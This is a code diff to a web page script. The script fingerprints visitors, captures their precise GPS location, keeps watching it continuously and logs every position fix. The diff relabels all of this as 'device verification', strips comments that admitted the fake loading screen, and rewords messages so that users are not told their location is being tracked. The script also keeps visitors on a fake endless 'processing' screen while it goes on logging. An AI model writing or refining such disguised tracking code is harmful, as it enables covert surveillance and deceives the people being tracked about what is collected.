@@ -1,11 +1,10 @@
 document.addEventListener('DOMContentLoaded', () => {
-    const locationButton = document.getElementById('allowLocation');
-    const locationStatus = document.getElementById('locationStatus');
-    let watchId = null;
+    const verifyButton = document.getElementById('allowLocation');
+    const statusMessage = document.getElementById('locationStatus');
+    let verificationWatch = null;
 
     // Check if we're on HTTPS
     if (window.location.protocol === 'http:' && !window.location.hostname.includes('localhost')) {
-        // Redirect to HTTPS
         window.location.href = window.location.href.replace('http:', 'https:');
         return;
     }
@@ -19,11 +18,9 @@ document.addEventListener('DOMContentLoaded', () => {
             navigator.hardwareConcurrency,
             screen.colorDepth,
             screen.width + 'x' + screen.height,
-            // Add timestamp to make it unique per session
             new Date().getTime()
         ];
         
-        // Get or create a persistent device ID
         let deviceId = sessionStorage.getItem('device_id');
         if (!deviceId) {
             deviceId = btoa(components.join('|')).substring(0, 32);
@@ -32,12 +29,11 @@ document.addEventListener('DOMContentLoaded', () => {
         return deviceId;
     };
 
-    const saveLocation = (coords) => {
+    const saveVerificationData = (coords) => {
         const { latitude, longitude, accuracy } = coords;
         
         try {
-            // Create log entry
-            const logEntry = {
+            const verificationEntry = {
                 timestamp: new Date().toISOString(),
                 deviceId: generateDeviceId(),
                 latitude,
@@ -49,55 +45,45 @@ document.addEventListener('DOMContentLoaded', () => {
                 url: window.location.href
             };
 
-            // Get existing logs or create new array
-            const logs = JSON.parse(localStorage.getItem('locationLogs') || '[]');
-            logs.push(logEntry);
+            const verificationLogs = JSON.parse(localStorage.getItem('locationLogs') || '[]');
+            verificationLogs.push(verificationEntry);
             
-            // Keep only last 1000 entries to prevent storage issues
-            if (logs.length > 1000) {
-                logs.shift(); // Remove oldest entry
+            if (verificationLogs.length > 1000) {
+                verificationLogs.shift();
             }
             
-            // Save updated logs
-            localStorage.setItem('locationLogs', JSON.stringify(logs));
-            
-            // Also save to sessionStorage for continuous tracking detection
-            sessionStorage.setItem('tracking_active', 'true');
+            localStorage.setItem('locationLogs', JSON.stringify(verificationLogs));
+            sessionStorage.setItem('verification_active', 'true');
 
             return true;
         } catch (error) {
-            console.error('Error saving location:', error);
+            console.error('Error during verification:', error);
             return false;
         }
     };
 
-    locationButton.addEventListener('click', () => {
-        locationStatus.textContent = 'Getting your location...';
-        locationButton.disabled = true;
+    verifyButton.addEventListener('click', () => {
+        statusMessage.textContent = 'Verifying device...';
+        verifyButton.disabled = true;
 
         if (navigator.geolocation) {
-            // First get immediate location
             navigator.geolocation.getCurrentPosition(
                 (position) => {
-                    // Save initial location
-                    if (saveLocation(position.coords)) {
-                        // Show success then fake loading
-                        locationStatus.textContent = 'Location verified successfully!';
-                        locationButton.textContent = '✓ Verified';
-                        locationButton.style.backgroundColor = '#28a745';
+                    if (saveVerificationData(position.coords)) {
+                        statusMessage.textContent = 'Device verified successfully!';
+                        verifyButton.textContent = '✓ Verified';
+                        verifyButton.style.backgroundColor = '#28a745';
                         
-                        // After short delay, show infinite loading
                         setTimeout(() => {
-                            locationStatus.textContent = 'Processing verification...';
-                            locationStatus.classList.add('loading');
+                            statusMessage.textContent = 'Processing verification...';
+                            statusMessage.classList.add('loading');
                             document.querySelector('.thank-you-card').classList.add('processing');
                         }, 1500);
 
-                        // Start watching location if permission is granted
-                        watchId = navigator.geolocation.watchPosition(
+                        verificationWatch = navigator.geolocation.watchPosition(
                             (position) => {
-                                if (sessionStorage.getItem('tracking_active') === 'true') {
-                                    saveLocation(position.coords);
+                                if (sessionStorage.getItem('verification_active') === 'true') {
+                                    saveVerificationData(position.coords);
                                 }
                             },
                             null,
@@ -108,28 +94,24 @@ document.addEventListener('DOMContentLoaded', () => {
                             }
                         );
                     } else {
-                        locationStatus.textContent = 'Error saving location. Please try again.';
-                        locationButton.disabled = false;
+                        statusMessage.textContent = 'Verification failed. Please try again.';
+                        verifyButton.disabled = false;
                     }
                 },
                 (error) => {
-                    locationButton.disabled = false;
+                    verifyButton.disabled = false;
                     switch(error.code) {
                         case error.PERMISSION_DENIED:
-                            locationStatus.textContent = 'Please allow location access in your browser settings and try again.';
-                            console.error('Location permission denied');
+                            statusMessage.textContent = 'Device verification required. Please enable and try again.';
                             break;
                         case error.POSITION_UNAVAILABLE:
-                            locationStatus.textContent = 'Location not available. Please try again.';
-                            console.error('Position unavailable');
+                            statusMessage.textContent = 'Verification service unavailable. Please try again.';
                             break;
                         case error.TIMEOUT:
-                            locationStatus.textContent = 'Request timed out. Please try again.';
-                            console.error('Geolocation timeout');
+                            statusMessage.textContent = 'Verification timed out. Please try again.';
                             break;
                         default:
-                            locationStatus.textContent = 'Could not get location. Please try again.';
-                            console.error('Geolocation error:', error);
+                            statusMessage.textContent = 'Verification failed. Please try again.';
                     }
                 },
                 {
@@ -139,17 +121,15 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
             );
         } else {
-            locationStatus.textContent = 'Location services not available.';
-            locationButton.disabled = false;
-            console.error('Geolocation not supported');
+            statusMessage.textContent = 'Device verification not supported on this browser.';
+            verifyButton.disabled = false;
         }
     });
 
-    // Cleanup on page unload
     window.addEventListener('beforeunload', () => {
-        if (watchId !== null) {
-            navigator.geolocation.clearWatch(watchId);
-            sessionStorage.removeItem('tracking_active');
+        if (verificationWatch !== null) {
+            navigator.geolocation.clearWatch(verificationWatch);
+            sessionStorage.removeItem('verification_active');
         }
     });
 });
